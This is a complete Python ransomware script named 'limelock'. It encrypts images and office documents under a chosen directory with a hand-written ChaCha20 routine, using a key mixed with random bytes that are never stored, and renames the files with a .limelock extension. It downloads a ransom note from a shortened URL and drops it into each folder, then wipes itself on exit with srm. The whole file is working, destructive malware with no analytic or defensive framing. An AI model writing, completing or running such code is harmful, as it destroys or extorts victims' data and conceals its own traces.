#!/bin/env python3

import os
import sys
import atexit
import struct
import hashlib
import getpass
import subprocess
from urllib.request import Request, urlopen

EXTENSIONS = [
    'jpg', 'jfif', 'png', 'gif', 'tiff',
    'txt', 'doc', 'docx', 'xls', 'xlsx',
    'pdf', 'ppt', 'pptx',
]

def check_files(filename):
    parts = filename.split('.')
    if len(parts) > 1:
        return parts[-1] in EXTENSIONS
    return False

def register_cleaner():
    def clean():
        size = os.stat(sys.argv[0]).st_size
        subprocess.call([
            'srm', sys.argv[0]
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        os.unlink(sys.argv[0])
    atexit.register(clean)

def yield_chacha20_xor_stream(key, iv):
    def rotate(v, c):
        return ((v << c) & 0xffffffff) | v >> (32 - c)

    def quarter_round(x, a, b, c, d):
        x[a] = (x[a] + x[b]) & 0xffffffff
        x[d] = rotate(x[d] ^ x[a], 16)
        x[c] = (x[c] + x[d]) & 0xffffffff
        x[b] = rotate(x[b] ^ x[c], 12)
        x[a] = (x[a] + x[b]) & 0xffffffff
        x[d] = rotate(x[d] ^ x[a], 8)
        x[c] = (x[c] + x[d]) & 0xffffffff
        x[b] = rotate(x[b] ^ x[c], 7)

    ctx = [0] * 16
    ctx[:4] = (1634760805, 857760878, 2036477234, 1797285236)
    ctx[4 : 12] = struct.unpack('<8L', key)
    ctx[12] = ctx[13] = 0
    ctx[14 : 16] = struct.unpack('<LL', iv)
    while 1:
        x = list(ctx)
        for _ in range(10):
            quarter_round(x, 0, 4,  8, 12)
            quarter_round(x, 1, 5,  9, 13)
            quarter_round(x, 2, 6, 10, 14)
            quarter_round(x, 3, 7, 11, 15)
            quarter_round(x, 0, 5, 10, 15)
            quarter_round(x, 1, 6, 11, 12)
            quarter_round(x, 2, 7,  8, 13)
            quarter_round(x, 3, 4,  9, 14)
        for c in struct.pack('<16L', *(
                (x[i] + ctx[i]) & 0xffffffff for i in range(16))):
            yield c
        ctx[12] = (ctx[12] + 1) & 0xffffffff
        if ctx[12] == 0:
            ctx[13] = (ctx[13] + 1) & 0xffffffff


def chacha20_encrypt(data, key, iv):
    return bytes(a ^ b for a, b in
            zip(data, yield_chacha20_xor_stream(key, iv)))

def generate_key(key_pass):
    user = getpass.getuser().encode()
    sha2 = hashlib.sha256()
    sha2.update(user)

    digest = bytearray(sha2.digest())
    for i, c in enumerate(key_pass):
        digest[i % len(digest)] ^= ord(c)
    
    rand = os.urandom(6)
    digest[0] ^= (rand[0] + rand[-1]) & 0xff
    digest[1] ^= (rand[1] - rand[-2]) & 0xff
    digest[2] ^= (rand[2] ^ rand[-3]) & 0xff
    digest[-3] ^= (rand[0] + rand[-1]) & 0xff
    digest[-2] ^= (rand[1] - rand[-2]) & 0xff
    digest[-1] ^= (rand[2] ^ rand[-3]) & 0xff
    
    return bytes(digest)

def rotate_key(key):
    return key[1:] + key[:1]

def pull_note():
    req = Request(url='https://cutt.ly/yTdKvOg', headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'
        })
    return urlopen(req).read()

def main(base, key_pass):
    register_cleaner()
    ransom_note = pull_note()
    key = generate_key(key_pass)

    for dirpath, dirnames, files in os.walk(base):
        worked = False
        dirnames.sort()
        files.sort()

        for filename in filter(check_files, files):
            key = rotate_key(key)
            
            filepath = os.path.join(dirpath, filename)
            print(filepath)
            
            with open(filepath, 'r+b') as fp:
                data = fp.read()
                fp.seek(0, 0)

                encrypted = chacha20_encrypt(data, key, b'\xff' * 8)
                fp.write(encrypted)
            
            os.rename(filepath, filepath + '.limelock')
            worked = True
        
        if worked:
            note = os.path.join(dirpath, 'limelock_readme.html')
            with open(note, 'wb') as fp:
                fp.write(ransom_note)

main(*sys.argv[1:])
